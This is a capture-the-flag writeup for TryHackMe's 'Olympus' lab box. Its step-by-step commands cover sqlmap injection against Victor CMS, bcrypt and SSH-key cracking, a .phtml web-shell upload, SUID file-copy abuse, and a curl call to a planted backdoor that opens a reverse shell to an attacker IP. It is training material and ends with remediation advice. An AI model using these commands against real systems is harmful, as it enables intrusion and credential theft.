# Olympus — TryHackMe Writeup

> **Room:** [Olympus](https://tryhackme.com/room/olympusroom) · **Difficulty:** Medium
> **Category:** Web / Boot2Root (CMS SQLi → upload → SUID → backdoor)
> **Author of writeup:** 0xnyx
> **Goal:** Four flags — SQLi a vulnerable CMS, pivot through two users, and trigger a planted backdoor for root.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/olympusroom), **no flags, passwords, or cracked values are included** — only the method. Brute-forcing login pages is out of scope for this room.

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**.

---

## Step 1 — Recon

**Do** — Scan, add the vhost, enumerate.

```bash
nmap -sVC -T4 -Pn <TARGET>
echo "<TARGET> olympus.thm" | sudo tee -a /etc/hosts
gobuster dir -u http://olympus.thm -w /usr/share/wordlists/dirb/common.txt
```

**You get** — A **Victor CMS** install reachable at `~webmaster/` (a known-vulnerable PHP CMS).

**Why / what next** — Victor CMS has SQL injection in its search. Brute is out of scope, so SQLi is the intended foothold.

---

## Step 2 — SQLi → Flag 1 + creds

**Do** — Inject through `search.php` (UNION-based).

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=x" --batch --dbs
sqlmap ... -D olympus --tables
sqlmap ... -D olympus -T flag,users --dump
```

**You get** — DB `olympus` with tables including **flag** and **users**. The `flag` table = **Flag 1**. The `users` table holds **prometheus**'s bcrypt hash.

**Why / what next** — Crack prometheus's hash offline (allowed — it's not a login brute), then reuse it.

```bash
hashcat -m 3200 prometheus.hash /usr/share/wordlists/rockyou.txt
```

---

## Step 3 — Foothold (chat app upload)

**Do** — There's a `chat.olympus.thm` vhost. Log in there as **prometheus** (password reuse), then upload a shell. The upload filter is image-only, so use `.phtml`.

```bash
echo "<TARGET> chat.olympus.thm" | sudo tee -a /etc/hosts
# upload shell.phtml via the chat app
```

**You get** — The upload filename is randomised and not browsable directly.

**Why / what next** — Use the **same SQLi** to read the chat DB and recover the randomised upload path, then hit it (nc listener first):

```bash
curl http://chat.olympus.thm/uploads/<random>.phtml
```

**You get** — A **www-data** shell → user flag in `/home/zeus/user.flag`.

---

## Step 4 — Pivot to zeus (SUID cputils)

**Do** — SUID sweep finds a custom binary.

```bash
find / -perm -4000 -type f 2>/dev/null   # → /usr/bin/cputils
```

**You get** — `cputils` is an interactive **file-copy tool running as the file owner** — we can read files we shouldn't, including zeus's SSH key.

**Why / what next** — Copy out zeus's encrypted `id_rsa`, crack the passphrase, SSH in:

```bash
cputils            # copy /home/zeus/.ssh/id_rsa to a readable location
ssh2john id_rsa > h ; john --wordlist=rockyou.txt h
ssh -i id_rsa zeus@<TARGET>
```

**You get** — zeus's shell.

---

## Step 5 — Root (planted backdoor)

**Do** — Enumerate the web root; there's a hidden directory with a backdoor webshell owned by zeus's group.

```bash
# /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
```

**You get** — The backdoor takes `ip`/`port`/`password` GET params and spawns a reverse shell (referencing `/lib/defended/libc.so.99`), and it runs as **root**.

**Why / what next** — Trigger it (nc listener first):

```bash
curl "http://<TARGET>/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=<ATTACKER>&port=4444&password=<pw>"
```

**You get** — `uid=0(root)` → **Flag 3** in `/root/root.flag`, and the **Flag 4** bonus elsewhere on disk.

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Vhost + Victor CMS | Entry point |
| 2 | SQLi (`search.php`) | Flag 1 + prometheus hash |
| 3 | Password reuse → `.phtml` upload (filename via SQLi) | www-data (user flag) |
| 4 | SUID `cputils` → steal + crack zeus id_rsa | SSH as zeus |
| 5 | Planted root backdoor webshell | Root (Flags 3 & 4) |

## Lessons

- When login brute is out of scope, **SQLi is the intended foothold** — dump creds, don't guess them.
- Password reuse across sub-apps (CMS → chat) is a reliable pivot.
- A custom **SUID file-copy tool** = arbitrary file read → steal SSH keys.
- Enumerate the web root as each user — planted backdoors are part of some boxes' design.

## Remediation

- Patch/replace Victor CMS; parameterise the search query.
- Validate uploads by content; store outside the web root.
- Don't ship SUID file utilities; keep private keys non-readable.
- Remove backdoors / audit the web root for unexpected PHP.

---

*Write-up for [TryHackMe — Olympus](https://tryhackme.com/room/olympusroom).*
